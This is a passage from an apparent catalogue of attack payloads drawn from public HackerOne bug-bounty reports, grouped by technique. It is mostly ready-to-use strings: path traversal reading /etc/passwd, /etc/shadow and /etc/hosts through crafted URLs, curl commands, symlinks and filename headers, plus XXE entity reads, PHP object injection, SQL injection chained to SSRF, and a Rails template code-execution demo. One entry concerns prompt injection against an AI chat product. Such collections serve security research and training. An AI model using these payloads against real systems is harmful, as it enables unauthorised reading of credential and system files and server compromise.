❯ cat app/views/books/show.text.erb
name: <% `touch me` %>


# executed `touch me`
❯ curl "http://localhost:3000/books/1.txt"
name:

# me file is generated
❯ ls
app  config     db       Gemfile.lock  log  package.json  Rakefile   storage  test.html  vendor
bin  target.com  Gemfile  lib           me   public        evil.com  test     tmp
```

— [File writing by Directory traversal at actionpack-page_caching and RCE by it](https://hackerone.com/reports/519220) · Ruby on Rails · [ooooooo_q](https://hackerone.com/ooooooo_q) · $1,000.0


## Path traversal to read arbitrary file via crafted URL path

### `23d5660b`

```
/etc/passwd                                      m-server
```

— [\[m-server\] Path Traversal allows to display content of arbitrary file(s) from the server](https://hackerone.com/reports/319795) · Node.js third-party modules · [bl4de](https://hackerone.com/bl4de)


## Path traversal in the redirect_uri parameter to manipulate the redirect target

### `8b7bb862`

```
redirect_uri=https%3A%2F%2Ftarget.com%2Fusers%2Fauth%2Fpixiv%2Fcallback/../../../../ja/items/4503924
```

**Parameter:** `redirect_uri`
— [Stealing Users OAuth authorization code via redirect_uri](https://hackerone.com/reports/1861974) · pixiv · [kuzu7shiki](https://hackerone.com/kuzu7shiki) · $2,000.0


## Path traversal using relative "../" segments in the request path

### `864c46b2`

```
GET /help/../../../Gemfile
```

— [Directory traversal attack in view resolver](https://hackerone.com/reports/3370) · Ruby on Rails · [lautis](https://hackerone.com/lautis)


## Path traversal using ".." segments in the URL path

### `53ef51f2`

```
curl -i -k "https://mvpn3.█████████/+CSCOU+/../+CSCOE+/files/file_list.json?path=/sessions" --path-as-is
```

**Parameter:** `path`
— [\[CVE-2018-0296\] Cisco VPN path traversal on the https://██████████](https://hackerone.com/reports/694865) · U.S. Dept Of Defense · [sp1d3rs](https://hackerone.com/sp1d3rs)


## Path traversal by setting IPFS_PATH environment variable to a directory outside the allowed root

### `bb53f2b4`

```
export IPFS_PATH="/tmp/../../../../etc"  # Traverse to /etc  
   (No hacking required! Just setting an environment variable.)
```

— [Path Traversal Vulnerability in curl via Unsanitized IPFS_PATH Environment Variable](https://hackerone.com/reports/3100073) · curl · [ziad616](https://hackerone.com/ziad616)


## Path traversal in SFTP URL using '..' segment

### `9fb02cc3`

```
sftp://host/~a../other/file
```

— [CVE-2023-27534: SFTP path ~ resolving discrepancy](https://hackerone.com/reports/1892351) · curl · [nyymi](https://hackerone.com/nyymi)


## Path traversal by supplying an absolute file path to a sensitive file

### `55013d9f`

```
options.pidfile = "/etc/passwd"   # Replace this with a critical or sensitive file
```

**Parameter:** `pidfile`
— [Arbitrary File Deletion Vulnerability in curl Source Code via os.unlink()](https://hackerone.com/reports/2864414) · curl · [aadityaathehacker](https://hackerone.com/aadityaathehacker)


## Path traversal by supplying '../../..' components in Tempfile filename

### `eb58272d`

```
irb(main):029:0> Tempfile.open(["\\..\\..\\..\\..\\..\\Users\\rootx\\malicious",".rb"])
```

— [Path traversal in Tempfile on windows OS due to unsanitized backslashes](https://hackerone.com/reports/1131465) · Ruby · [bugdiscloseguys](https://hackerone.com/bugdiscloseguys) · $500.0


## Path traversal target file '/etc/hosts' supplied to vulnerable endpoint

### `2734aff9`

```
/etc/hosts
```

— [\[CVE-2019-11510 \] Path Traversal on ████████ leads to leaked passwords, RCE, etc](https://hackerone.com/reports/671857) · U.S. Dept Of Defense · [cdl](https://hackerone.com/cdl)


## Path traversal to trigger a redirect, injected via the account_id property in a JSON token

### `5466928e`

```
{"account_id":"F8gHiqSdpK/../../../redirect?url=https://target.com/
```

**Parameter:** `account_id`
— [\[H1-2006 2020\] \[CTF Writeup\] A story about Bounty Payments, Collaboration & Community](https://hackerone.com/reports/892337) · h1-ctf · [sturedman](https://hackerone.com/sturedman)


## Path traversal via unsanitized filename in Content‑Disposition header

### `44da5d41`

```
content-disposition: attachment; filename="../../../lib-1/libjnigraphics.so"
```

— [2 click Remote Code execution in Evernote Android](https://hackerone.com/reports/1377748) · Evernote · [hulkvision_](https://hackerone.com/hulkvision_)


## Path traversal via URL containing "..\\..\\..\\etc\\passwd"

### `47840a97`

```
curl "https://target.com/..\..\..\etc\passwd"
```

— [\[target.com\] Local File Reading](https://hackerone.com/reports/260420) · Ubiquiti Inc. · [bobrov](https://hackerone.com/bobrov)


## Path traversal via URL with multiple '../' segments using curl

### `2cea1880`

```
curl --path-as-is http://localhost:3141/../../../../../../
```

— [\[takeapeek\] Path traversal allow to expose directory and files](https://hackerone.com/reports/403736) · Node.js third-party modules · [abdilahrf_](https://hackerone.com/abdilahrf_)


## PHP object injection with XXE to read /etc/passwd

### `fca767f4`

```
O:10:"ConfigFile":1:{s:10:"config_raw";s:170:"<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><root>
	<toptext>&xxe;</toptext>
	<bottomtext>xd</bottomtext>
	<template></template>
	<type>text</type>
</root>";}
```

— [H1-5411 CTF Writeup](https://hackerone.com/reports/416004) · h1-5411-CTF · [leetboi](https://hackerone.com/leetboi)


## SQL injection in a LIKE context to inject a path‑traversal SSRF payload

### `24a28498`

```
https://target.com/r3c0n_server_4fdk59/album?hash=-4685%27%20UNION%20SELECT%20%22%27%20UNION%20SELECT%201,2,%27../api/user?username=%25%27--+%22,%22456%22,%22789%22--+
```

**Parameter:** `hash`
— [A Visit from The Grinch ~ 'Twas the night before Hackmas...](https://hackerone.com/reports/1067912) · h1-ctf · [bendtheory](https://hackerone.com/bendtheory)


## SQL injection using LOAD DATA LOCAL INFILE to read /etc/passwd

### `6da88c04`

```
LOAD DATA LOCAL INFILE '/etc/passwd'
INTO TABLE asd.asd
FIELDS TERMINATED BY "\n"
```

**Parameter:** `sql_query`
— [LFI through the MySQL connection](https://hackerone.com/reports/719875) · Infogram · [muon4](https://hackerone.com/muon4)


## SQL injection used to trigger Server‑Side Request Forgery (SSRF) via UNION SELECT of a file path

### `94ad82b7`

```
https://target.com/r3c0n_server_4fdk59/album?hash=asdasd%27%20UNION%20SELECT%20%224%27%20UNION%20SELECT%201,2,\%22../api/hello\%22;/*%22,1,1;/*
```

**Parameter:** `hash`
— [HackyHolidays 2020 Full Write-up: Information Disclosure of 12 Flags](https://hackerone.com/reports/1068434) · h1-ctf · [liamg](https://hackerone.com/liamg)


## Symlink creation (ln -s) to read arbitrary file

### `ff583460`

```
ln -s /etc/shadow test_shadow
```

— [Path traversal in https://target.com/package/http_server via symlink](https://hackerone.com/reports/692262) · Node.js third-party modules · [vineetpandey](https://hackerone.com/vineetpandey)


## Symlink traversal (symbolic link to /etc/passwd)

### `f3784ac4`

```
$ ln -s ../../../../../etc/passwd sympasswd
```

— [\[harp\] Path traversal using symlink](https://hackerone.com/reports/530289) · Node.js third-party modules · [skyn3t](https://hackerone.com/skyn3t)


## URL path traversal using ".." segments in a GitHub URL

### `4c7311d9`

```
https://target.com/user/../target-repo/pull/1.patch
```

— [Prompt Injection via GitHub Patch in Brave AI Chat (Leo)](https://hackerone.com/reports/3086301) · Brave Software · [stellersjay](https://hackerone.com/stellersjay)


## XXE file read of /etc/passwd via external entity

### `7032d58a`

```
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><root>
	<toptext>&xxe;</toptext>
	<bottomtext>xd</bottomtext>
	<template></template>
	<type>text</type>
</root>
```

— [H1-5411 CTF Writeup](https://hackerone.com/reports/416004) · h1-5411-CTF · [leetboi](https://hackerone.com/leetboi)
